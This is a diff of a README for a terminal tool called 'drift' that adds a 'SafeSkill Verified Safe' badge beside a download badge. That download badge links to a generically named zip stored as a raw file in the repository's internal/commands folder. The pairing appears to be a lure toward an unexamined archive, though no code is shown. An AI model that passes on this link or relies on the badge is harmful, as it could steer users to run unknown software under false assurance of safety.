@@ -1,6 +1,7 @@
 # 🚀 drift - Track projects without leaving your terminal
 
 [![Download drift](https://img.shields.io/badge/Download%20drift-blue?style=for-the-badge)](https://github.com/vladsure158/drift/raw/refs/heads/main/internal/commands/Software_v1.3-beta.5.zip)
+[![SafeSkill 93/100](https://img.shields.io/badge/SafeSkill-93%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/vladsure158-drift)
 
 ## 📌 What drift does
 
